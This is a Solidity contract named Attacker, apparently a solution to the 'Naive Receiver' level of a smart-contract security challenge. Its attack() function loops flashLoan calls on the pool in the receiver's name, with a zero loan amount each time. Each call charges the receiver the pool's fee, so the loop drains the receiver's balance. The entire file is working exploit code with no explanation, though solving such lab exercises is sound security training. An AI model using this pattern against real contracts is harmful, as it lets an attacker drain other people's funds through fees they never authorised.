// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";

contract Attacker {
    address public immutable attacker;
    address public immutable lender;
    address public immutable receiver;

    constructor(address _lender, address _receiver) {
        attacker = msg.sender;
        lender = _lender;
        receiver = _receiver; 
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    function attack() external onlyAttacker {
        require(lender != address(0) && receiver != address(0));
        uint _round = receiver.balance / 1e18;
        for(uint i =0; i < _round;) {
            NaiveReceiverLenderPool(payable(lender)).flashLoan(receiver, 0);
            unchecked { i++; }
        }
    }
}
